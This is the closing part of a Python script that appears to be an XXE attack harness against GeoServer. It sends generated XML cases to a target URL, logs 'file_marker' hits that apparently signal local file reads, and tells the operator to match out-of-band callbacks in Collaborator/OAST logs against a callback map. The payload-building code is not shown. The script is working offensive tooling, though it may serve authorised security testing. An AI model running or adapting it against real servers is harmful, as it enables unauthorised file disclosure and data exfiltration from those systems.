    args = parse_args(argv)
    cases = build_cases(args)
    if args.max_cases:
        cases = cases[: args.max_cases]

    timestamp = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = Path(args.output_dir or f"results/geoserver_xxe_{timestamp}")
    output_dir.mkdir(parents=True, exist_ok=True)

    map_path = output_dir / "callback_map.csv"
    results_path = output_dir / "results.jsonl"
    raw_dir = Path(args.save_raw_dir) if args.save_raw_dir else output_dir / "raw"
    write_case_map(map_path, cases)
    save_raw_requests(raw_dir, args, cases)

    print(f"[+] base_url={args.base_url}")
    print(f"[+] cases={len(cases)}")
    print(f"[+] callback_map={map_path}")
    print(f"[+] raw_requests={raw_dir}")

    if args.dry_run:
        print("[+] dry run complete; no requests sent")
        return 0

    opener = request_opener(args)
    with results_path.open("w") as out:
        for idx, case in enumerate(cases, start=1):
            result = send_case(opener, args, case)
            out.write(json.dumps(result, sort_keys=True) + "\n")
            marker = result["blocked_marker"] or result["file_marker"] or result["error"] or ""
            print(
                f"[{idx:04d}/{len(cases):04d}] {case.case_id} "
                f"status={result['status']} bytes={result['response_bytes']} marker={marker}"
            )
            if args.delay:
                time.sleep(args.delay)

    print(f"[+] results={results_path}")
    print("[+] Check your Collaborator/OAST logs and match hits against callback_map.csv.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
